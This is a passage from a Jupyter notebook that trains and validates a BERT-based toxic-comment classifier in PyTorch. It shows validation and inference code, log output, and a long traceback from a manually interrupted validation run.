    "                outputs = model(inputs, attention_masks)\n",
    "                loss = criterion(outputs, targets)\n",
    "\n",
    "                batch_size = inputs.size(0)\n",
    "\n",
    "                final_scores.update(targets, outputs)\n",
    "                losses.update(loss.detach().item(), batch_size)\n",
    "\n",
    "    def run_inference(model, device, config, test_loader):\n",
    "        model.eval()\n",
    "        result = {'id': [], 'toxic': []}\n",
    "        t = time.time()\n",
    "\n",
    "        for step, (ids, inputs, attention_masks) in enumerate(test_loader):\n",
    "            if config.verbose:\n",
    "                if step % config.verbose_step == 0:\n",
    "                    logger.info(f'Prediction Step {step}, time: {(time.time() - t):.5f}')\n",
    "\n",
    "            with torch.no_grad():\n",
    "                inputs = inputs.to(device, dtype=torch.long)\n",
    "                attention_masks = attention_masks.to(device, dtype=torch.long)\n",
    "                outputs = model(inputs, attention_masks)\n",
    "                toxics = nn.functional.softmax(outputs, dim=1).data.cpu().numpy()[:,1]\n",
    "\n",
    "            result['id'].extend(ids.cpu().numpy())\n",
    "            result['toxic'].extend(toxics)\n",
    "    #validation_sampler = torch.utils.data.distributed.DistributedSampler(\n",
    "    #    validation_dataset,\n",
    "    #    num_replicas=xm.xrt_world_size(),\n",
    "    #    rank=xm.get_ordinal(),\n",
    "    #    shuffle=False\n",
    "    #)\n",
    "    validation_loader = torch.utils.data.DataLoader(\n",
    "        validation_dataset,\n",
    "        batch_size=TrainGlobalConfig.batch_size,\n",
    "    #    sampler=validation_sampler,\n",
    "        pin_memory=False,\n",
    "        drop_last=False,\n",
    "        num_workers=TrainGlobalConfig.num_workers\n",
    "    )\n",
    "\n",
    "    losses, final_scores = validation(net, device, TrainGlobalConfig, validation_loader, TrainGlobalConfig.criterion)\n",
    "    logger.info(f\"Val results: losses={losses}, final_scores={final_scores}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[INFO]2020-06-09 07:45:17,517:utils:Valid Step 0, loss: 0.00000, final_score: 0.00000, time: 0.01215\n",
      "[INFO]2020-06-09 07:48:38,111:utils:Valid Step 50, loss: 1.15285, final_score: 0.54787, time: 200.60581\n",
      "[INFO]2020-06-09 07:51:59,574:utils:Valid Step 100, loss: 1.15266, final_score: 0.51856, time: 402.06876\n",
      "[INFO]2020-06-09 07:55:23,595:utils:Valid Step 150, loss: 1.15911, final_score: 0.52318, time: 606.09007\n",
      "[INFO]2020-06-09 07:58:45,861:utils:Valid Step 200, loss: 1.16109, final_score: 0.51224, time: 808.35630\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-35-7dda87b451b4>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0m_gpu_fn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m<ipython-input-34-ec4624ae4583>\u001b[0m in \u001b[0;36m_gpu_fn\u001b[0;34m()\u001b[0m\n\u001b[1;32m     80\u001b[0m     )\n\u001b[1;32m     81\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 82\u001b[0;31m     \u001b[0mlosses\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfinal_scores\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mvalidation\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mnet\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdevice\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mTrainGlobalConfig\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mvalidation_loader\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mTrainGlobalConfig\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcriterion\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     83\u001b[0m     \u001b[0mlogger\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0minfo\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf\"Val results: losses={losses}, final_scores={final_scores}\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m<ipython-input-34-ec4624ae4583>\u001b[0m in \u001b[0;36mvalidation\u001b[0;34m(model, device, config, val_loader, criterion)\u001b[0m\n\u001b[1;32m     39\u001b[0m                 \u001b[0mtargets\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtargets\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mto\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdevice\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdtype\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mtorch\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfloat\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     40\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 41\u001b[0;31m                 \u001b[0moutputs\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mmodel\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0minputs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mattention_masks\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     42\u001b[0m                 \u001b[0mloss\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mcriterion\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0moutputs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtargets\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     43\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/torch/nn/modules/module.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *input, **kwargs)\u001b[0m\n\u001b[1;32m    556\u001b[0m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_slow_forward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    557\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 558\u001b[0;31m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mforward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    559\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mhook\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_forward_hooks\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvalues\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    560\u001b[0m             \u001b[0mhook_result\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mhook\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m<ipython-input-16-dee804600c89>\u001b[0m in \u001b[0;36mforward\u001b[0;34m(self, input_ids, attention_masks)\u001b[0m\n\u001b[1;32m     18\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mforward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0minput_ids\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mattention_masks\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     19\u001b[0m         \u001b[0mbs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mseq_length\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0minput_ids\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshape\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 20\u001b[0;31m         \u001b[0mseq_x\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0m_\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbackbone\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0minput_ids\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0minput_ids\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mattention_mask\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mattention_masks\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     21\u001b[0m         \u001b[0mapool\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtorch\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmean\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mseq_x\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     22\u001b[0m         \u001b[0mmpool\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0m_\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtorch\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmax\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mseq_x\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/torch/nn/modules/module.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *input, **kwargs)\u001b[0m\n\u001b[1;32m    556\u001b[0m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_slow_forward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    557\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 558\u001b[0;31m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mforward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    559\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mhook\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_forward_hooks\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvalues\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    560\u001b[0m             \u001b[0mhook_result\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mhook\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/transformers/modeling_bert.py\u001b[0m in \u001b[0;36mforward\u001b[0;34m(self, input_ids, attention_mask, token_type_ids, position_ids, head_mask, inputs_embeds, encoder_hidden_states, encoder_attention_mask)\u001b[0m\n\u001b[1;32m    788\u001b[0m             \u001b[0mhead_mask\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mhead_mask\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    789\u001b[0m             \u001b[0mencoder_hidden_states\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mencoder_hidden_states\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 790\u001b[0;31m             \u001b[0mencoder_attention_mask\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mencoder_extended_attention_mask\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    791\u001b[0m         )\n\u001b[1;32m    792\u001b[0m         \u001b[0msequence_output\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mencoder_outputs\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/torch/nn/modules/module.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *input, **kwargs)\u001b[0m\n\u001b[1;32m    556\u001b[0m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_slow_forward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    557\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 558\u001b[0;31m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mforward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    559\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mhook\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_forward_hooks\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvalues\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    560\u001b[0m             \u001b[0mhook_result\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mhook\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/transformers/modeling_bert.py\u001b[0m in \u001b[0;36mforward\u001b[0;34m(self, hidden_states, attention_mask, head_mask, encoder_hidden_states, encoder_attention_mask)\u001b[0m\n\u001b[1;32m    405\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    406\u001b[0m             layer_outputs = layer_module(\n\u001b[0;32m--> 407\u001b[0;31m                 \u001b[0mhidden_states\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mattention_mask\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mhead_mask\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mi\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mencoder_hidden_states\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mencoder_attention_mask\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    408\u001b[0m             )\n\u001b[1;32m    409\u001b[0m             \u001b[0mhidden_states\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mlayer_outputs\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/torch/nn/modules/module.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *input, **kwargs)\u001b[0m\n\u001b[1;32m    556\u001b[0m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_slow_forward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    557\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 558\u001b[0;31m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mforward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    559\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mhook\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_forward_hooks\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvalues\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    560\u001b[0m             \u001b[0mhook_result\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mhook\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/transformers/modeling_bert.py\u001b[0m in \u001b[0;36mforward\u001b[0;34m(self, hidden_states, attention_mask, head_mask, encoder_hidden_states, encoder_attention_mask)\u001b[0m\n\u001b[1;32m    366\u001b[0m         \u001b[0mencoder_attention_mask\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mNone\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    367\u001b[0m     ):\n\u001b[0;32m--> 368\u001b[0;31m         \u001b[0mself_attention_outputs\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mattention\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhidden_states\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mattention_mask\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mhead_mask\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    369\u001b[0m         \u001b[0mattention_output\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself_attention_outputs\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    370\u001b[0m         \u001b[0moutputs\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself_attention_outputs\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m]\u001b[0m  \u001b[0;31m# add self attentions if we output attention weights\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/torch/nn/modules/module.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *input, **kwargs)\u001b[0m\n\u001b[1;32m    556\u001b[0m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_slow_forward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    557\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 558\u001b[0;31m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mforward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    559\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mhook\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_forward_hooks\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvalues\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    560\u001b[0m             \u001b[0mhook_result\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mhook\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/transformers/modeling_bert.py\u001b[0m in \u001b[0;36mforward\u001b[0;34m(self, hidden_states, attention_mask, head_mask, encoder_hidden_states, encoder_attention_mask)\u001b[0m\n\u001b[1;32m    312\u001b[0m     ):\n\u001b[1;32m    313\u001b[0m         self_outputs = self.self(\n\u001b[0;32m--> 314\u001b[0;31m             \u001b[0mhidden_states\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mattention_mask\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mhead_mask\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mencoder_hidden_states\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mencoder_attention_mask\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    315\u001b[0m         )\n\u001b[1;32m    316\u001b[0m         \u001b[0mattention_output\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0moutput\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself_outputs\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mhidden_states\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/torch/nn/modules/module.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *input, **kwargs)\u001b[0m\n\u001b[1;32m    556\u001b[0m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_slow_forward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    557\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 558\u001b[0;31m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mforward\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    559\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mhook\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_forward_hooks\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvalues\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    560\u001b[0m             \u001b[0mhook_result\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mhook\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0minput\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "_gpu_fn()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "INecI_CbxXA_"
   },
   "outputs": [],
   "source": [
    "def _mp_fn(rank, flags):\n",
